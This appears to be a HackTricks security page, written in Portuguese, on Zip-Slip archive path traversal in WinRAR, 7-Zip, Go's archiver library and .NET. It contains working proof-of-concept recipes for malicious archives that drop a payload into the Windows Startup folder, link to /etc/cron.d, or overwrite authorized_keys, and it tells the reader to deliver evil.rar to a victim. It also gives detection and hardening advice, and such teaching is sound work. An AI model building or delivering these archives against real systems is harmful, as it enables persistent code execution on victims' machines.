# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Visão geral

Muitos formatos de archive (ZIP, RAR, TAR, 7-ZIP, etc.) permitem que cada entrada contenha seu próprio **caminho interno**. Quando um utilitário de extração respeita cegamente esse caminho, um nome de arquivo criado contendo `..` ou um **caminho absoluto** (por exemplo, `C:\Windows\System32\`) será gravado fora do diretório escolhido pelo usuário.
Essa classe de vulnerabilidade é amplamente conhecida como *Zip-Slip* ou **archive extraction path traversal**.<sup>[[6]](#references)</sup>

As consequências variam desde a sobrescrita de arquivos arbitrários até a obtenção direta de **remote code execution (RCE)** ao colocar um payload em um local de **execução automática**, como a pasta *Startup* do Windows.

## Causa raiz

1. O atacante cria um archive em que um ou mais cabeçalhos de arquivo contêm:
* Sequências de traversal relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Caminhos absolutos (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Ou **symlinks** criados para resolver fora do diretório de destino (comum em ZIP/TAR no *nix*).
2. A vítima extrai o archive com uma ferramenta vulnerável que confia no caminho incorporado (ou segue symlinks), em vez de sanitizá-lo ou forçar a extração dentro do diretório escolhido.
3. O arquivo é gravado no local controlado pelo atacante e executado/carregado na próxima vez que o sistema ou o usuário acionar esse caminho.

### `.NET` `Path.Combine` + `ZipArchive` traversal

Um anti-pattern comum em .NET é combinar o destino pretendido com `ZipArchiveEntry.FullName` **controlado pelo usuário** e extrair sem normalização do caminho:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Se `entry.FullName` começar com `..\\`, ele realiza traversal; se for um **absolute path**, o componente à esquerda será completamente descartado, resultando em uma **arbitrary file write** usada como identidade da extração.
- Archive de prova de conceito para escrever em um diretório `app` irmão monitorado por um scanner agendado:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Colocar esse ZIP na caixa de entrada monitorada resulta em `C:\samples\app\0xdf.txt`, comprovando traversal para fora de `C:\samples\queue\` e habilitando primitives subsequentes (por exemplo, DLL hijacks).

## Exemplo do mundo real – WinRAR ≤ 7.12 (CVE-2025-8088)

O WinRAR para Windows (incluindo a CLI `rar` / `unrar`, a DLL e o source portátil) não validava os nomes de arquivos durante a extração.  
Um arquivo RAR malicioso contendo uma entrada como:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
acabaria **fora** do diretório de saída selecionado e dentro da pasta *Startup* do usuário. Após o logon, o Windows executa automaticamente tudo o que estiver presente nela, fornecendo RCE *persistent*.<sup>[[5]](#references)</sup>

### Criando um Archive PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opções usadas:
* `-ep`  – armazena os caminhos dos arquivos exatamente como fornecidos (não remova o `./` inicial).

Entregue `evil.rar` à vítima e instrua-a a extraí-lo com uma versão vulnerável do WinRAR.

### Exploração observada na prática

A ESET relatou campanhas de spear-phishing do RomCom (Storm-0978/UNC2596) que anexavam arquivos RAR abusando da CVE-2025-8088 para implantar backdoors personalizados e facilitar operações de ransomware.<sup>[[5]](#references)</sup>

## Casos mais recentes (2024–2025)

### Travessia de symlink em ZIP do 7-Zip → RCE (CVE-2025-11001 / ZDI-25-949)
* **Falha**: entradas ZIP que eram **symbolic links** eram desreferenciadas durante a extração, permitindo que atacantes escapassem do diretório de destino e sobrescrevessem caminhos arbitrários. A interação do usuário limita-se a *abrir/extrair* o arquivo.<sup>[[1]](#references)</sup>
* **Afetados**: 7-Zip 21.02–24.09 (compilações para Windows e Linux). Corrigido na versão **25.00** (julho de 2025) e posteriores.
* **Caminho do impacto**: Sobrescrever `Start Menu/Programs/Startup` ou locais de execução de serviços → o código é executado no próximo logon ou reinício do serviço.
* **PoC rápida (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Em uma versão corrigida, `/etc/cron.d` não será tocado; o symlink será extraído como um link dentro de `/tmp/target`.

### Zip-Slip em `Unarchive()` do Go mholt/archiver (CVE-2025-3445)
* **Falha**: `archiver.Unarchive()` segue `../` e entradas ZIP com symlinks, gravando fora de `outputDir`.<sup>[[2]](#references)</sup>
* **Afetado**: `github.com/mholt/archiver` ≤ 3.5.1 (o projeto agora está deprecated).
* **Correção**: Mude para `mholt/archives` ≥ 0.1.0 ou implemente verificações de caminho canonicalizado antes da gravação.
* **Reprodução mínima**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Dicas de detecção

* **Inspeção estática** – Liste as entradas do arquivo e sinalize qualquer nome que contenha `../`, `..\\`, *caminhos absolutos* (`/`, `C:`) ou entradas do tipo *symlink* cujo destino esteja fora do diretório de extração.
* **Canonicalização** – Garanta que `realpath(join(dest, name))` ainda comece com `dest`. Rejeite caso contrário.<sup>[[3]](#references)</sup>
* **Extração em sandbox** – Descompacte em um diretório descartável usando um extractor *seguro* (por exemplo, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) e verifique se os caminhos resultantes permanecem dentro do diretório.
* **Monitoramento de endpoints** – Gere um alerta quando novos executáveis forem gravados em locais `Startup`/`Run`/`cron` logo após um arquivo ser aberto pelo WinRAR/7-Zip/etc.

## Mitigação e hardening

1. **Atualize o extractor** – WinRAR 7.13+ e 7-Zip 25.00+ implementam sanitização de caminhos/symlinks. Ambas as ferramentas ainda não possuem atualização automática.
2. Extraia arquivos com “**Do not extract paths**” / “**Ignore paths**” quando possível.
3. No Unix, reduza os privilégios e monte um **chroot/namespace** antes da extração; no Windows, use **AppContainer** ou uma sandbox.
4. Ao escrever código personalizado, normalize com `realpath()`/`PathCanonicalize()` **antes** de criar/gravar e rejeite qualquer entrada que escape do destino.

## Casos adicionais afetados / históricos

* 2018 – Advisory massivo de *Zip-Slip* da Snyk afetando muitas bibliotecas Java/Go/JS.<sup>[[6]](#references)</sup>
* 2023 – CVE-2023-4011 do 7-Zip, uma travessia semelhante durante a mesclagem com `-ao`.
* 2025 – `go-slug` da HashiCorp (CVE-2025-0377), travessia durante a extração de TAR em slugs (correção na v1.2).<sup>[[7]](#references)</sup>
* Qualquer lógica de extração personalizada que não chame `PathCanonicalize` / `realpath` antes da gravação.

## Referências

- [1] [Trend Micro ZDI-25-949 – Travessia de ZIP com symlink no 7-Zip (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – Zip-Slip no mholt/archiver (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Como prevenir Zip Slip no .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – Cadeia ZipSlip → sequestro de DLL no HTB Bruno](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Atualize as ferramentas do WinRAR agora: RomCom e outros explorando vulnerabilidade zero-day (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Divulgação pública de uma vulnerabilidade crítica de sobrescrita arbitrária de arquivos: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug vulnerável a ataque Zip Slip (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
